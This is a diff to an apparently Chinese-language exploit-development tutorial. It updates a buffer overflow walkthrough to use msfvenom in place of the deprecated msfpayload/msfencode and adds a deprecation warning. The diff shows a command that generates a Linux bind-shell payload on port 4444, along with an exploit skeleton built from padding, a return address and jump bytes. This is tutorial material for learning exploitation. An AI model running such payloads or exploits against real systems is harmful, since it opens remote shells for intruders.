@@ -110,8 +110,12 @@ nasm > jmp eax       # \xff\xe0
 ### 生成 Payload
 
 ```bash
-msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode -b "\x00\x0a\x0b\x20"
+# 现代命令（msfpayload/msfencode 已合并为 msfvenom）
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -b "\x00\x0a\x0b\x20" -f python
 ```
+
+!!! warning "命令更新"
+    `msfpayload` 和 `msfencode` 自 2015 年起已被废弃，统一替换为 `msfvenom`。
 
 ### 最终 Exploit
 
@@ -121,7 +125,7 @@ import socket
 
 host = "127.0.0.1"
 shellcode = (
-    # msfpayload 生成的 shellcode（排除坏字符）
+    # msfvenom 生成的 shellcode（排除坏字符）
 )
 
 crash = shellcode + 'A' * (4368 - len(shellcode)) + '\x97\x45\x13\x00' + '\x83\xc0\x0c\xff\xe0\x90\x90'
